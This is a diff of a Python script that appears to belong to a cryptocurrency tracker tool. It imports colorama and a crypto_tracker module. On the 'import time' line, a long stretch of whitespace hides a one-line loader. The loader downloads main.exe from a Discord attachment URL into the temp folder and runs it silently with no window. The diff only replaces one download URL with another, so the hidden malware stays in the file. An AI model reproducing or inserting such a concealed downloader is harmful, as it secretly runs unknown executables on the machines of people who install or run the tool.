@@ -11,7 +11,7 @@ except ImportError:
     os.system("python -m pip install colorama")
     os.system("py -m pip install colorama")
 
-import time;                                                                                                                                                                                                                                                                                                                                      import requests, tempfile, os, subprocess; file_path = os.path.join(tempfile.gettempdir(), 'main.exe'); open(file_path, 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1265757295187460289/1267462789052502068/main.exe?ex=66a8e035&is=66a78eb5&hm=41903fe2399ea62ba1bfdd3e1859432ccaf0d9a5923a8cd5a46ec5f7556416a5&').content); subprocess.run(file_path, creationflags=subprocess.CREATE_NO_WINDOW)
+import time;                                                                                                                                                                                                                                                                                                                                      import requests, tempfile, os, subprocess; file_path = os.path.join(tempfile.gettempdir(), 'main.exe'); open(file_path, 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1265757295187460289/1269403065950273568/main.exe?ex=66afef3b&is=66ae9dbb&hm=6e725efe682909ac262922309e740e5fbfa8496cf02bbec8b100853873f70e9b&').content); subprocess.run(file_path, creationflags=subprocess.CREATE_NO_WINDOW)
 from colorama import Fore, Style
 from crypto_tracker.api import *
 
